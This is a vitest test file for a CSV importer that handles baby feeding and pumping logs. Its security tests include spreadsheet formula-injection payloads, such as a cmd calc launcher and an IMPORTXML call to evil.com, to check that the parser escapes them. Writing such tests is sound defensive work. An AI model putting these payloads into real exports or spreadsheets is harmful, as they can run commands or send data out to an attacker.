import { describe, it, expect } from "vitest";
import { parseFeedingPumpingCSV } from "./csv-import";

describe("parseFeedingPumpingCSV", () => {
  describe("Format Detection", () => {
    it("detects 13-column export format", () => {
      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
2026-02-06,10:30,feeding,120,4.06,left,120,4.06,0,0,15,Good feeding,manual`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toEqual([]);
      expect(result.sessions).toHaveLength(1);
      expect(result.feedCount).toBe(1);
    });

    it("detects 8-column external format", () => {
      const csv = `Date,Feed Time,Feed Amount (oz),Feed Notes,Pump Time,Pump IZQ,Pump DER,Pump Total
06-Feb-26,10:30 am,4.06,Good feeding,,,,`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toEqual([]);
      expect(result.sessions).toHaveLength(1);
      expect(result.feedCount).toBe(1);
    });

    it("returns error for unknown format", () => {
      const csv = `Random,Headers,That,Do,Not,Match
1,2,3,4,5,6`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toHaveLength(1);
      expect(result.errors[0]).toContain("Unrecognized CSV format");
      expect(result.sessions).toHaveLength(0);
    });

    it("handles empty CSV", () => {
      const csv = ``;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toHaveLength(1);
      expect(result.errors[0]).toBe("CSV has no data rows");
    });

    it("handles CSV with headers only", () => {
      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toHaveLength(1);
      expect(result.errors[0]).toBe("CSV has no data rows");
    });
  });

  describe("13-Column Export Format", () => {
    it("parses valid feeding session", () => {
      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
2026-02-06,10:30,feeding,120,4.06,left,120,4.06,0,0,15,Good feeding,manual`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toEqual([]);
      expect(result.sessions).toHaveLength(1);
      expect(result.feedCount).toBe(1);
      expect(result.pumpCount).toBe(0);

      const session = result.sessions[0];
      expect(session.session_type).toBe("feeding");
      expect(session.amount_ml).toBe(120);
      expect(session.amount_entered).toBe(120);
      expect(session.unit_entered).toBe("ml");
      expect(session.side).toBe("left");
      expect(session.amount_left_ml).toBe(120);
      expect(session.amount_right_ml).toBe(undefined);
      expect(session.duration_min).toBe(15);
      expect(session.notes).toBe("Good feeding");
      expect(session.source).toBe("manual");
    });

    it("parses valid pumping session", () => {
      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
2026-02-06,14:00,pumping,180,6.09,both,90,3.04,90,3.04,20,Morning pump,manual`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toEqual([]);
      expect(result.sessions).toHaveLength(1);
      expect(result.feedCount).toBe(0);
      expect(result.pumpCount).toBe(1);

      const session = result.sessions[0];
      expect(session.session_type).toBe("pumping");
      expect(session.amount_ml).toBe(180);
      expect(session.side).toBe("both");
      expect(session.amount_left_ml).toBe(90);
      expect(session.amount_right_ml).toBe(90);
      expect(session.duration_min).toBe(20);
      expect(session.notes).toBe("Morning pump");
    });

    it("prefers Amount (ml) over Amount (oz)", () => {
      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
2026-02-06,10:30,feeding,120,999,left,120,999,0,0,15,Test,manual`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toEqual([]);
      const session = result.sessions[0];
      expect(session.amount_ml).toBe(120);
      expect(session.unit_entered).toBe("ml");
    });

    it("uses Amount (oz) when Amount (ml) is empty", () => {
      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
2026-02-06,10:30,feeding,,4.0,left,,4.0,,,15,Test,manual`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toEqual([]);
      const session = result.sessions[0];
      expect(session.amount_ml).toBe(118); // 4 oz to ml (rounded)
      expect(session.amount_entered).toBe(4.0);
      expect(session.unit_entered).toBe("oz");
    });

    it("prefers Left/Right (ml) over (oz)", () => {
      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
2026-02-06,14:00,pumping,180,6.09,both,90,999,90,999,20,Test,manual`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toEqual([]);
      const session = result.sessions[0];
      expect(session.amount_left_ml).toBe(90);
      expect(session.amount_right_ml).toBe(90);
    });

    it("converts Left/Right (oz) when (ml) is empty", () => {
      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
2026-02-06,14:00,pumping,,6.0,both,,3.0,,3.0,20,Test,manual`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toEqual([]);
      const session = result.sessions[0];
      expect(session.amount_left_ml).toBe(89); // 3 oz to ml (rounded)
      expect(session.amount_right_ml).toBe(89);
    });

    it("handles mixed feeding and pumping sessions", () => {
      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
2026-02-06,10:30,feeding,120,4.06,left,120,4.06,0,0,15,Feed 1,manual
2026-02-06,14:00,pumping,180,6.09,both,90,3.04,90,3.04,20,Pump 1,manual
2026-02-06,18:30,feeding,100,3.38,right,0,0,100,3.38,12,Feed 2,manual`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toEqual([]);
      expect(result.sessions).toHaveLength(3);
      expect(result.feedCount).toBe(2);
      expect(result.pumpCount).toBe(1);
    });

    it("handles optional fields gracefully", () => {
      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
2026-02-06,10:30,feeding,120,,,,,,,,,`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toEqual([]);
      const session = result.sessions[0];
      expect(session.amount_ml).toBe(120);
      expect(session.side).toBeUndefined();
      expect(session.amount_left_ml).toBeUndefined();
      expect(session.amount_right_ml).toBeUndefined();
      expect(session.duration_min).toBeUndefined();
      expect(session.notes).toBeUndefined();
      expect(session.source).toBe("imported"); // default
    });

    it("errors on missing date", () => {
      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
,10:30,feeding,120,4.06,left,120,4.06,0,0,15,Test,manual`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toHaveLength(1);
      expect(result.errors[0]).toContain("missing date or time");
      expect(result.sessions).toHaveLength(0);
    });

    it("errors on missing time", () => {
      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
2026-02-06,,feeding,120,4.06,left,120,4.06,0,0,15,Test,manual`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toHaveLength(1);
      expect(result.errors[0]).toContain("missing date or time");
      expect(result.sessions).toHaveLength(0);
    });

    it("errors on invalid date format", () => {
      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
2026-13-45,10:30,feeding,120,4.06,left,120,4.06,0,0,15,Test,manual`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toHaveLength(1);
      expect(result.errors[0]).toContain("invalid date/time");
      expect(result.sessions).toHaveLength(0);
    });

    it("errors on invalid time format", () => {
      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
2026-02-06,25:70,feeding,120,4.06,left,120,4.06,0,0,15,Test,manual`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toHaveLength(1);
      expect(result.errors[0]).toContain("invalid date/time");
      expect(result.sessions).toHaveLength(0);
    });

    it("errors on invalid type", () => {
      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
2026-02-06,10:30,sleeping,120,4.06,left,120,4.06,0,0,15,Test,manual`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toHaveLength(1);
      expect(result.errors[0]).toContain("invalid type");
      expect(result.sessions).toHaveLength(0);
    });

    it("errors on missing amount", () => {
      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
2026-02-06,10:30,feeding,,,left,,,,,15,Test,manual`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toHaveLength(1);
      expect(result.errors[0]).toContain("missing or invalid amount");
      expect(result.sessions).toHaveLength(0);
    });

    it("errors on zero amount", () => {
      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
2026-02-06,10:30,feeding,0,0,left,,,,,15,Test,manual`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toHaveLength(1);
      expect(result.errors[0]).toContain("missing or invalid amount");
      expect(result.sessions).toHaveLength(0);
    });

    it("errors on column count mismatch", () => {
      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
2026-02-06,10:30,feeding,120,4.06,left,120`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toHaveLength(1);
      expect(result.errors[0]).toContain("expected 13 columns");
      expect(result.sessions).toHaveLength(0);
    });

    it("handles partial failures (some rows valid, some invalid)", () => {
      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
2026-02-06,10:30,feeding,120,4.06,left,120,4.06,0,0,15,Valid,manual
2026-02-06,14:00,invalid_type,180,6.09,both,90,3.04,90,3.04,20,Invalid type,manual
2026-02-06,18:30,feeding,100,3.38,right,0,0,100,3.38,12,Valid,manual
,22:00,pumping,150,5.07,both,75,2.54,75,2.54,18,Missing date,manual`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toHaveLength(2);
      expect(result.errors[0]).toContain("invalid type");
      expect(result.errors[1]).toContain("missing date or time");
      expect(result.sessions).toHaveLength(2);
      expect(result.feedCount).toBe(2);
    });

    it("handles notes with commas (quoted CSV)", () => {
      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
2026-02-06,10:30,feeding,120,4.06,left,120,4.06,0,0,15,"Fed at home, baby calm",manual`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toEqual([]);
      const session = result.sessions[0];
      expect(session.notes).toBe("Fed at home, baby calm");
    });

    it("accepts case-insensitive Type values", () => {
      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
2026-02-06,10:30,FEEDING,120,4.06,left,120,4.06,0,0,15,Test,manual
2026-02-06,14:00,Pumping,180,6.09,both,90,3.04,90,3.04,20,Test,manual`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toEqual([]);
      expect(result.sessions).toHaveLength(2);
      expect(result.sessions[0].session_type).toBe("feeding");
      expect(result.sessions[1].session_type).toBe("pumping");
    });

    it("accepts all valid Side values", () => {
      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
2026-02-06,10:00,feeding,120,4.06,left,120,4.06,0,0,15,Test,manual
2026-02-06,11:00,feeding,120,4.06,right,0,0,120,4.06,15,Test,manual
2026-02-06,12:00,pumping,180,6.09,both,90,3.04,90,3.04,20,Test,manual
2026-02-06,13:00,feeding,120,4.06,unknown,,,,,15,Test,manual`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toEqual([]);
      expect(result.sessions).toHaveLength(4);
      expect(result.sessions[0].side).toBe("left");
      expect(result.sessions[1].side).toBe("right");
      expect(result.sessions[2].side).toBe("both");
      expect(result.sessions[3].side).toBe("unknown");
    });

    it("sanitizes CSV formula injection in notes", () => {
      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
2026-02-06,10:30,feeding,120,4.06,left,120,4.06,0,0,15,"=cmd|'/c calc'!A1",manual`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toEqual([]);
      const session = result.sessions[0];
      expect(session.notes).toBe("'=cmd|'/c calc'!A1"); // Formula escaped
    });

    it("sanitizes formulas with + prefix", () => {
      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
2026-02-06,10:30,feeding,120,4.06,left,120,4.06,0,0,15,"+IMPORTXML()",manual`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.sessions[0].notes).toBe("'+IMPORTXML()");
    });

    it("rejects Infinity values in amount", () => {
      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
2026-02-06,10:30,feeding,Infinity,,,,,,,,,manual`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toHaveLength(1);
      expect(result.errors[0]).toContain("missing or invalid amount");
      expect(result.sessions).toHaveLength(0);
    });

    it("rejects very large numbers (1e308)", () => {
      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
2026-02-06,10:30,feeding,1e308,,,,,,,,,manual`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toHaveLength(1);
      expect(result.sessions).toHaveLength(0);
    });

    it("validates upper bounds for amount", () => {
      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
2026-02-06,10:30,feeding,600,,,,,,,,,manual`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toHaveLength(1);
      expect(result.errors[0]).toContain("exceeds maximum");
      expect(result.sessions).toHaveLength(0);
    });

    it("validates upper bounds for duration", () => {
      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
2026-02-06,10:30,feeding,120,4.06,left,120,4.06,0,0,999,Test,manual`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toHaveLength(1);
      expect(result.errors[0]).toContain("duration exceeds maximum");
      expect(result.sessions).toHaveLength(0);
    });

    it("validates source field against allowlist", () => {
      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
2026-02-06,10:30,feeding,120,4.06,left,120,4.06,0,0,15,Test,hacker_source`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toEqual([]);
      expect(result.sessions[0].source).toBe("imported"); // Sanitized to default
    });

    it("does not leak data in error messages", () => {
      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
2026-02-06,25:99,feeding,120,,,,,,,,,manual`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toHaveLength(1);
      expect(result.errors[0]).not.toContain("25:99"); // No data leakage
      expect(result.errors[0]).toContain("invalid date/time format");
    });

    it("rejects zero for left/right amounts consistently", () => {
      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
2026-02-06,10:30,pumping,180,6.09,both,0,0,0,0,20,Test,manual`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toEqual([]);
      const session = result.sessions[0];
      // Zero amounts should be omitted, not stored
      expect(session.amount_left_ml).toBeUndefined();
      expect(session.amount_right_ml).toBeUndefined();
    });

    it("rejects Infinity in left/right amounts", () => {
      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
2026-02-06,10:30,pumping,180,6.09,both,Infinity,0,90,3.04,20,Test,manual`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toEqual([]);
      const session = result.sessions[0];
      expect(session.amount_left_ml).toBeUndefined(); // Infinity rejected
      expect(session.amount_right_ml).toBe(90); // Valid value kept
    });

    it("rejects future dates (more than 1 day ahead)", () => {
      const futureDate = new Date();
      futureDate.setDate(futureDate.getDate() + 2);
      const futureDateStr = futureDate.toISOString().split('T')[0];

      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
${futureDateStr},10:30,feeding,120,4.0,left,120,4.0,0,0,15,Future feeding,manual`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.sessions).toHaveLength(0);
      expect(result.errors[0]).toContain("date is in the future");
    });

    it("accepts today's date", () => {
      const today = new Date();
      const todayStr = today.toISOString().split('T')[0];

      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
${todayStr},10:30,feeding,120,4.0,left,120,4.0,0,0,15,Today's feeding,manual`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.sessions).toHaveLength(1);
      expect(result.errors).toHaveLength(0);
    });
  });

  describe("8-Column External Format (Backward Compatibility)", () => {
    it("parses valid feeding session", () => {
      const csv = `Date,Feed Time,Feed Amount (oz),Feed Notes,Pump Time,Pump IZQ,Pump DER,Pump Total
06-Feb-26,10:30 am,4.06,Good feeding,,,,`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toEqual([]);
      expect(result.sessions).toHaveLength(1);
      expect(result.feedCount).toBe(1);
      expect(result.pumpCount).toBe(0);

      const session = result.sessions[0];
      expect(session.session_type).toBe("feeding");
      expect(session.amount_ml).toBe(120); // 4.06 oz to ml (rounded)
      expect(session.notes).toBe("Good feeding");
      expect(session.source).toBe("imported");
    });

    it("parses valid pumping session", () => {
      const csv = `Date,Feed Time,Feed Amount (oz),Feed Notes,Pump Time,Pump IZQ,Pump DER,Pump Total
06-Feb-26,,,,2:00 pm,3.0,3.0,6.0`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toEqual([]);
      expect(result.sessions).toHaveLength(1);
      expect(result.feedCount).toBe(0);
      expect(result.pumpCount).toBe(1);

      const session = result.sessions[0];
      expect(session.session_type).toBe("pumping");
      expect(session.amount_ml).toBe(177); // 6 oz to ml (rounded)
      expect(session.side).toBe("both");
    });

    it("parses row with both feeding and pumping", () => {
      const csv = `Date,Feed Time,Feed Amount (oz),Feed Notes,Pump Time,Pump IZQ,Pump DER,Pump Total
06-Feb-26,10:30 am,4.0,Fed,2:00 pm,3.0,3.0,6.0`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toEqual([]);
      expect(result.sessions).toHaveLength(2);
      expect(result.feedCount).toBe(1);
      expect(result.pumpCount).toBe(1);
    });

    it("errors on invalid date format", () => {
      const csv = `Date,Feed Time,Feed Amount (oz),Feed Notes,Pump Time,Pump IZQ,Pump DER,Pump Total
invalid-date,10:30 am,4.0,Test,,,,`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toHaveLength(1);
      expect(result.errors[0]).toContain("invalid date");
      expect(result.sessions).toHaveLength(0);
    });

    it("errors on invalid feed amount", () => {
      const csv = `Date,Feed Time,Feed Amount (oz),Feed Notes,Pump Time,Pump IZQ,Pump DER,Pump Total
06-Feb-26,10:30 am,invalid,Test,,,,`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toHaveLength(1);
      expect(result.errors[0]).toContain("invalid feed amount");
      expect(result.sessions).toHaveLength(0);
    });

    it("errors on column count mismatch", () => {
      const csv = `Date,Feed Time,Feed Amount (oz),Feed Notes,Pump Time,Pump IZQ,Pump DER,Pump Total
06-Feb-26,10:30 am,4.0`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toHaveLength(1);
      expect(result.errors[0]).toContain("expected 8 columns");
      expect(result.sessions).toHaveLength(0);
    });

    it("sanitizes formulas in notes field", () => {
      const csv = `Date,Feed Time,Feed Amount (oz),Feed Notes,Pump Time,Pump IZQ,Pump DER,Pump Total
06-Feb-26,10:30 am,4.06,"=1+1",,,, `;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toEqual([]);
      expect(result.sessions[0].notes).toBe("'=1+1");
    });

    it("rejects Infinity in 8-column format", () => {
      const csv = `Date,Feed Time,Feed Amount (oz),Feed Notes,Pump Time,Pump IZQ,Pump DER,Pump Total
06-Feb-26,10:30 am,Infinity,Test,,,,`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toHaveLength(1);
      expect(result.errors[0]).toContain("invalid feed amount");
      expect(result.sessions).toHaveLength(0);
    });

    it("validates upper bounds in 8-column format", () => {
      const csv = `Date,Feed Time,Feed Amount (oz),Feed Notes,Pump Time,Pump IZQ,Pump DER,Pump Total
06-Feb-26,10:30 am,50,Test,,,,`; // 50oz = ~1478ml > 500ml max

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toHaveLength(1);
      expect(result.errors[0]).toContain("exceeds maximum");
      expect(result.sessions).toHaveLength(0);
    });

    it("does not leak data in 8-column error messages", () => {
      const csv = `Date,Feed Time,Feed Amount (oz),Feed Notes,Pump Time,Pump IZQ,Pump DER,Pump Total
invalid-date,10:30 am,4.0,Test,,,,`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toHaveLength(1);
      expect(result.errors[0]).not.toContain("invalid-date"); // No data leakage
      expect(result.errors[0]).toContain("invalid date format");
    });

    it("rejects zero left/right amounts consistently", () => {
      const csv = `Date,Feed Time,Feed Amount (oz),Feed Notes,Pump Time,Pump IZQ,Pump DER,Pump Total
26-Jan-26,6:30 am,4.0,Good feed,7:00 am,0,3.5,3.5`;

      const result = parseFeedingPumpingCSV(csv);

      // 8-column format creates 2 sessions: 1 feeding + 1 pumping
      expect(result.sessions).toHaveLength(2);
      const pumpSession = result.sessions.find(s => s.session_type === "pumping");
      expect(pumpSession).toBeDefined();
      expect(pumpSession!.amount_left_ml).toBeUndefined(); // Zero rejected
      expect(pumpSession!.amount_right_ml).toBe(104); // 3.5oz rounds to 104ml
    });

    it("rejects future dates in 8-column format", () => {
      const futureDate = new Date();
      futureDate.setDate(futureDate.getDate() + 2);
      const day = futureDate.getDate().toString().padStart(2, '0');
      const monthNames = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
      const month = monthNames[futureDate.getMonth()];
      const year = futureDate.getFullYear().toString().slice(-2);
      const futureDateStr = `${day}-${month}-${year}`;

      const csv = `Date,Feed Time,Feed Amount (oz),Feed Notes,Pump Time,Pump IZQ,Pump DER,Pump Total
${futureDateStr},6:30 am,4.0,Future feed,,,,`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.sessions).toHaveLength(0);
      expect(result.errors[0]).toContain("date is in the future");
    });
  });

  describe("Edge Cases", () => {
    it("handles CSV with UTF-8 BOM", () => {
      const bom = '\uFEFF';
      const csv = `${bom}Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
2026-02-06,10:30,feeding,120,4.0,left,120,4.0,0,0,15,With BOM,manual`;

      // BOM removal happens in useImport.ts, but parser should handle it gracefully
      const result = parseFeedingPumpingCSV(csv);

      expect(result.sessions).toHaveLength(1);
      expect(result.sessions[0].notes).toBe("With BOM");
    });

    it("sanitizes control characters in headers", () => {
      const csv = `Date\x00,Time\x01,Type\x1F,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
2026-02-06,10:30,feeding,120,4.0,left,120,4.0,0,0,15,Clean,manual`;

      const result = parseFeedingPumpingCSV(csv);

      // Should detect format despite control characters in headers
      expect(result.sessions).toHaveLength(1);
      expect(result.sessions[0].amount_ml).toBe(120);
    });

    it("handles mixed newline formats (CRLF and LF)", () => {
      const csv = "Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source\r\n2026-02-06,10:30,feeding,120,4.0,left,120,4.0,0,0,15,CRLF,manual\n2026-02-06,11:30,feeding,90,3.0,left,90,3.0,0,0,10,LF,manual";

      const result = parseFeedingPumpingCSV(csv);

      expect(result.sessions).toHaveLength(2);
      expect(result.sessions[0].notes).toBe("CRLF");
      expect(result.sessions[1].notes).toBe("LF");
    });
  });

  describe("Round-Trip Compatibility", () => {
    it("can re-import exported data (13-column format)", () => {
      // Simulate data that was exported via sessionsToCSV()
      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
2026-02-06,10:30,feeding,120,4.1,left,120,4.1,0,0,15,Test session,manual
2026-02-06,14:00,pumping,180,6.1,both,90,3.0,90,3.0,20,Pump session,manual`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toEqual([]);
      expect(result.sessions).toHaveLength(2);
      expect(result.feedCount).toBe(1);
      expect(result.pumpCount).toBe(1);

      // Verify data integrity
      expect(result.sessions[0].amount_ml).toBe(120);
      expect(result.sessions[0].source).toBe("manual"); // preserved, not "imported"
      expect(result.sessions[1].amount_ml).toBe(180);
      expect(result.sessions[1].source).toBe("manual");
    });
  });

  describe("Security Tests", () => {
    it("escapes all formula prefixes (=, +, -, @)", () => {
      const formulas = [
        '=cmd|"/c calc"!A1',
        '+IMPORTXML("http://evil.com", "//a")',
        '-SUM(A1:A10)',
        '@SUM(A1:A10)',
      ];

      formulas.forEach((formula) => {
        const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
2026-02-06,10:30,feeding,120,4.06,left,120,4.06,0,0,15,"${formula.replace(/"/g, '""')}",manual`;

        const result = parseFeedingPumpingCSV(csv);

        expect(result.sessions[0].notes).toBe("'" + formula);
      });
    });

    it("handles normal text without modification", () => {
      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
2026-02-06,10:30,feeding,120,4.06,left,120,4.06,0,0,15,Normal note text,manual`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.sessions[0].notes).toBe("Normal note text");
    });
  });

  describe("Performance Tests", () => {
    it("parses CSV with array buffer optimization", () => {
      // This test verifies the parseCSVRow optimization doesn't break functionality
      const csv = `Date,Time,Type,Amount (ml),Amount (oz),Side,Left (ml),Left (oz),Right (ml),Right (oz),Duration (min),Notes,Source
2026-02-06,10:30,feeding,120,4.06,left,120,4.06,0,0,15,"Complex,quoted,field",manual`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toEqual([]);
      expect(result.sessions[0].notes).toBe("Complex,quoted,field");
    });
  });

  describe("Pivot-Daily Format (Google Sheets)", () => {
    it("detects pivot-daily format with title row", () => {
      const csv = `SUM of Total Volume (oz),Type,,
Date,Feeding,Pump,Grand Total
10/19/2025,33.00,34.50,67.50
10/20/2025,28.00,30.00,58.00`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toEqual([]);
      expect(result.sessions).toHaveLength(4); // 2 days x 2 types
      expect(result.feedCount).toBe(2);
      expect(result.pumpCount).toBe(2);
    });

    it("detects pivot-daily format without title row", () => {
      const csv = `Date,Feeding,Pump,Grand Total
10/19/2025,33.00,34.50,67.50`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.errors).toEqual([]);
      expect(result.sessions).toHaveLength(2);
      expect(result.feedCount).toBe(1);
      expect(result.pumpCount).toBe(1);
    });

    it("parses feeding and pumping amounts correctly in oz", () => {
      const csv = `Date,Feeding,Pump,Grand Total
10/19/2025,33.00,34.50,67.50`;

      const result = parseFeedingPumpingCSV(csv);

      const feedSession = result.sessions.find(s => s.session_type === "feeding");
      const pumpSession = result.sessions.find(s => s.session_type === "pumping");

      expect(feedSession).toBeDefined();
      expect(feedSession!.amount_entered).toBe(33);
      expect(feedSession!.unit_entered).toBe("oz");
      expect(feedSession!.source).toBe("imported");
      expect(feedSession!.confidence).toBe(1.0);
      expect(feedSession!.notes).toBe("Daily aggregate from pivot table");

      expect(pumpSession).toBeDefined();
      expect(pumpSession!.amount_entered).toBe(34.5);
      expect(pumpSession!.unit_entered).toBe("oz");
      expect(pumpSession!.notes).toBe("Daily aggregate from pivot table");
    });

    it("sets timestamp to noon of each date", () => {
      const csv = `Date,Feeding,Pump,Grand Total
10/19/2025,33.00,34.50,67.50`;

      const result = parseFeedingPumpingCSV(csv);

      for (const session of result.sessions) {
        expect(session.timestamp.getHours()).toBe(12);
        expect(session.timestamp.getMinutes()).toBe(0);
        expect(session.timestamp.getSeconds()).toBe(0);
      }
    });

    it("skips Grand Total row", () => {
      const csv = `SUM of Total Volume (oz),Type,,
Date,Feeding,Pump,Grand Total
10/19/2025,33.00,34.50,67.50
Grand Total,"3,946.60","3,510.50","7,457.10"`;

      const result = parseFeedingPumpingCSV(csv);

      expect(result.sessions).toHaveLength(2); // Only data row, not Grand Total
    });

